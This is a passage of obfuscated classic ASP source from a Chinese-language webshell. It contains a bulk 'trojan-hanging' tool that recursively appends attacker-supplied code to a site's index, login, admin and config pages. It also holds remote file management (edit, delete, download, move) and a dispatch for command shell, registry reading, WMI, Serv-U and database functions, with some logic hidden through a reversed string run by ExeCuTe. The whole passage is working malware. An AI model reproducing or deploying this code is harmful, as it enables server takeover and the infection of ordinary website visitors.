	For Each myfile in fc2
		If CheckExt(F4SO.GetExtensionName(path&"\"&myfile.name)) Then
			Call IsFind(Path&"\"&myfile.name)
			SumFiles = SumFiles + 1
		End If
	Next
	Set fc = f.SubFolders
	For Each f1 in fc
		ShowAllFile2 path&"\"&f1.name
		SumFolders = SumFolders + 1
    Next
	Set F4SO = Nothing:End Sub:Sub IsFind(thePath):theDate = GetDateModify(thePath)
	on error resume next
	theTmp = Mid(theDate, 1, Instr(theDate, " ") - 1)
	if err then exit Sub
	xDate = Split(request.Form("Search_Date"),";")
	If request.Form("Search_Date") = "ALL" Then ALLTime = True
	For i = 0 To Ubound(xDate)
		If theTmp = xDate(i) or ALLTime = True Then 
			If request("Search_Content") <> "" Then
				Set FSO2s = CreateObject("Scripting.FileSystemObject")
				set ofile = FSO2s.OpenTextFile(thePath, 1, false, -2)
				filetxt = Lcase(ofile.readall())
				If Instr( filetxt, LCase(request.Form("Search_Content"))) > 0 Then
					temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(Replace(replace(thePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a>"
    temp=temp&" → <a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"	
				Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
					Report = Report&"<tr><td>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
					Sun = Sun + 1
					Exit Sub
				End If
				ofile.close()
				Set ofile = Nothing
				Set FSO2s = Nothing
			Else
				temp = "<a href=""http://"&Request.Servervariables("server_name")&"/"&tURLEncode(replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&replace(thePath,server.MapPath("\")&"\","",1,1,1)&"</a> "
    temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a > "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
	temp=temp&"<a href='javascript:FullForm("""&replace(replace(FilePath,server.MapPath("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"	
				Report = Report&"<tr><td height=30>"&temp&"</td><td>"&GetDateCreate(thePath)&"</td><td>"&theDate&"</td></tr>"
				Sun = Sun + 1
				Exit Sub
			End If
		End If
	Next:End Sub
Case "plgm"
Server.ScriptTimeout=1000000 
Response.Buffer=False 
RRS ("<b>当前网站绝对路径:")&Server.MapPath("/")&("</b>")
ASP_SELF=Request.ServerVariables("PATH_INFO") 
s=Request("fd") 
if s="" then s=Server.MapPath("/")
ex=Request("ex") 
pth=Request("pth") 
newcnt=Request("newcnt") 
addcode = Request("code")
if addcode="" then addcode="<"
If ex<>"" AND pth<>"" Then 
select Case ex 
Case "edit" 
CALL file_show(pth) 
Case "save" 
CALL file_save(pth) 
End select 
Else 
RRS("<form method=""POST""> ")
RRS("<table width=560 border=""0"" style=""font-size:12px;"">")
RRS("<tr>")
RRS("<td width=""102"">要挂马的文件夹 (绝对路径)：</td>")
RRS("<td width=""359""><input type=""text"" name=""fd"" value="""&s&""" size=60></td>")
RRS("<td width=""69"">&nbsp;</td>")
RRS("</tr><tr><td>要挂马的代码:</td>")
RRS("<td><textarea name=""code"" cols=58 rows=""3"">"&addcode&"</textarea></td>")
RRS("<td><input name=""submit"" type=""submit"" value=""开始""></td>")
RRS("</tr></table></form> ")
End If
Function IsPattern(patt,str) 
ShiSan="fI dnE~ eslaF=nrettaPsI~ eslE~ eurT=nrettaPsI~ nehT eurT=laVter fI~ gnihtoN=xEger teS~ )rts(tseT.xEger=laVter~ eurT=esaCerongI.xEger~ ttap=nrettaP.xEger~ pxEgeR weN=xEger teS":ExeCuTe(UZSS(ShiSan)):End Function 
if request.form("submit")<>"" then
If s="" or addcode="" Then
RRS "<font color=red>请输入挂马的路径或代码!</font>"
response.end
else If IsPattern("[^ab]{1}:{1}(\\|\/)",s) Then sch s 
End If
end if 
Sub sch(s):oN eRrOr rEsUmE nExT 
Set fs=Server.createObject("Scripting.FileSystemObject") 
Set fd=fs.GetFolder(s) 
Set fi=fd.Files 
Set sf=fd.SubFolders 
For Each f in fi 
rtn=f.path 
step_all rtn 
Next 
If sf.Count<>0 Then 
For Each l In sf 
sch l 
Next 
End If:End Sub:Sub step_all(agr):retVal=IsPattern("(\\|\/)(default|index|conn|admin|bbs|reg|help|upfile|upload|cart|class|login|diy|no|ok|del|config|sql|user|ubb|ftp|asp|top|new|open|name|email|img|images|web|blog|save|data|add|edit|game|about|manager|main|article|book|bt|config|mp3|vod|error|copy|move|down|system|logo|QQ|520|newup|myup|play|show|view|ip|err404|send|foot|char|info|list|shop|err|nc|ad|flash|text|admin_upfile|admin_upload|upfile_load|upfile_soft|upfile_photo|upfile_softpic|vip|505)\.(htm|html|asp|php|jsp|aspx|cgi|js)\b",agr) 
If retVal Then 
step1 agr 
step2 agr 
Else 
Exit Sub:End If:End Sub:Sub step1(str1):RRS "<div style='line-height:20px'>√ "&str1&" _"
RRs "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DownFile"")' class='am' title='下载'>Down</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""EditFile"")' class='am' title='编辑'>edit</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='删除'>Del</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a></div>":End Sub :Sub step2(str2):Set fs=Server.createObject("Scripting.FileSystemObject") 
isExist=fs.FileExists(str2) 
If isExist Then 
Set f=fs.GetFile(str2) 
Set f_addcode=f.OpenAsTextStream(8,-2) 
f_addcode.Write addcode 
f_addcode.Close 
Set f=Nothing 
End If 
Set fs=Nothing:End Sub:Err.Clear:Case "Cplgm":Fpath=Request("fd")
	addcode = Request("code")
	addcode2 = Request("code2")
	pcfile=request("pcfile")
	checkbox=request("checkbox")
	ShowMsg=request("ShowMsg")
	FType=request("FType")
	M=request("M")
	if Ftype="" then Ftype="txt|htm|html|asp|php|jsp|aspx|cgi|cer|asa|cdx"
	if Fpath="\" then Fpath=Server.MapPath("\")
	if Fpath="." or Fpath="" then Fpath=Server.MapPath(".")	
	if addcode="" then addcode="<"
	if checkbox="" then checkbox=request("checkbox")
	if pcfile="" then
		pcfileName=Request.ServerVariables("SCRIPT_NAME")
		pcfilek=split(pcfileName,"/") 
		pcfilen=ubound(pcfilek) 
		pcfile=pcfilek(pcfilen) 
	end if
  	RRS ("<b>网站根目录</b>- "&Server.MapPath("/")&"<br>")
	RRS ("<b>本程序目录</b>- "&Server.MapPath("."))
	RRS "<form method=POST><div style='color:#00FF00'><b>[" 
	if M="1" then RRS"批量挂马器-批量挂马"
	if M="2" then RRS"批量清马器-清除别人的网马"
	if M="3" then RRS"批量替换器-文件替换修改工具"
	if M="" then response.end
	RRS "]</b></div><table width=100% border=0><tr><td>文件路径：</td>"
	RRS "<td><input type=text name=fd value='"&Fpath&"' size=40> 填“\”即网站根目录；“.”为程序所在目录</td></tr>"
	if M="1" then RRS "<tr><td>过滤重复：</td><td><input class=c name='checkbox' type=checkbox value='checked' "&checkbox&"> 防止一个页面中有多个重复的代码</td></tr>"
	RRS "<tr><td>排除文件：</td>"
	RRS "<td><input name='pcfile' type=text id='pcfile' value='"&pcfile&"' size=40> 输入不想被修改的文件名，例如：1.asp|2.asp|3.asp</td></tr>"
	RRS "<tr><td>文件类型：</td>"
	RRS "<td><input name='FType' type=text id='FType' value='"&Ftype&"' size=40> 输入要修改的文件类型[扩展名]，例如：htm|html|asp|php|jsp|aspx|cgi</td></tr><tr><td><font color=#00FF00>"
	if M="1" then RRS"要挂的马："
	if M="2" then RRS"要清的马："
	if M="3" then RRS"查找内容："
	RRS"</font></td><td><textarea name=code cols=66 rows=3>"&addcode&"</textarea></td></tr>"
	if M="3" then RRS "<tr><td><font color=#00FF00>替 换 为：</font></td><td><textarea name=code2 cols=66 rows=3>"&addcode2&"</textarea></td></tr>"
	RRS "<tr><td></td><td> <input name=submit type=submit value=开始执行> --标记解释--[成功：√ ， 排除： ， 重复：<font color=red></font>]</td></tr>"
	RRS "</table></form>" 
if request("submit")="开始执行" then 
RRS"<div style='line-height:25px'><b>执行记录：</b><br>"
call InsertAllFiles(Fpath,addcode,pcfile)
RRS"</div>"
end if:Sub InsertAllFiles(Wpath,Wcode,pc):Server.ScriptTimeout=999999999
	 if right(Wpath,1)<>"\" then Wpath=Wpath &"\"
	 Set WFSO = CreateObject("Scripting.FileSystemObject")
	 on error resume next 
	 Set f = WFSO.GetFolder(Wpath)
	 Set fc2 = f.files
	 For Each myfile in fc2
		Set FS1 = CreateObject("Scripting.FileSystemObject")
		FType1=split(myfile.name,".") 
		FType2=ubound(FType1) 
		if Ftype2>0 then
		FType3=LCase(FType1(FType2)) 
		else
		FType3="无"
		end if
		if Instr(LCase(pc),LCase(myfile.name))=0 and Instr(LCase(FType),FType3)<>0 then
			select case M
				case "1"
					if checkbox<>"checked" then
						Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
						tfile.writeline Wcode
						RRS"√ "&Wpath&myfile.name
						tfile.close
					else
						Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
						if Instr(tfile1.readall,Wcode)=0 then
							Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
							tfile.writeline Wcode
							RRS"√  "&Wpath&myfile.name
							tfile1.close
						else
							RRS"<font color=red></font> "&Wpath&myfile.name
							tfile1.close
						end if
						Set tfile1=Nothing
					end if
				case "2"
					Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
					NewCode=Replace(tfile1.readall,Wcode,"")
					Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
					objCountFile.Write NewCode
					objCountFile.Close
					RRS"√  "&Wpath&myfile.name
					Set objCountFile=Nothing
				case "3"
					Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
					NewCode=Replace(tfile1.readall,Wcode,addCode2)
					Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
					objCountFile.Write NewCode
					objCountFile.Close
					RRS"√  "&Wpath&myfile.name
					Set objCountFile=Nothing
				case else
					RRS"你很想破吗?真的很想破吗?没门我告诉你.":response.end
			end select
		else
			RRS" "&Wpath&myfile.name
		end if
RRS " → <a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""DownFile"")' class='am' title='下载'>Down</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""EditFile"")' class='am' title='编辑'>edit</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a><br>"
	 Next
 Set fsubfolers = f.SubFolders
 For Each f1 in fsubfolers
	NewPath=Wpath&""&f1.name
 	InsertAllFiles NewPath,Wcode,pc
 Next
set tfile=nothing
Set FSO = Nothing
set tfile=nothing
set tfile2=nothing
Set WFSO = Nothing:End Sub:Case "ReadREG":call ReadREG():Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing:Case "DownFile":DownFile FName:ShowErr():Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing:Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing:Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing:Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing:Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing:Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing:Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing:Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing:Case "UpFile":UpFile():Case "Cmd1Shell":Cmd1Shell():Case "Logout":Session.Contents.Remove("web2a2dmin"):Response.Redirect URL:Case "CreateMdb":CreateMdb FName:Case "CompactMdb":CompactMdb FName:Case "DbManager":DbManager():Case "Course":Course():Case "wmi":wmi():Case "ScanDriveForm" : ScanDriveForm:Case "ScanDrive"     : ScanDrive Request("Drive"):Case "ScFolder"      : ScFolder Request("Folder"):Case "adminab":adminab():Case "sqlabc":sqlabc():Case "fuck":fuck():Case "hook":hook():Case "gody":gody():Case "suftp":suftp():Case "upload":upload():Case "ServerInfo":ServerInfo():Case Else MainForm():End Select
if Action<>"Servu" then ShowErr():RRS"</body></html>"
%> 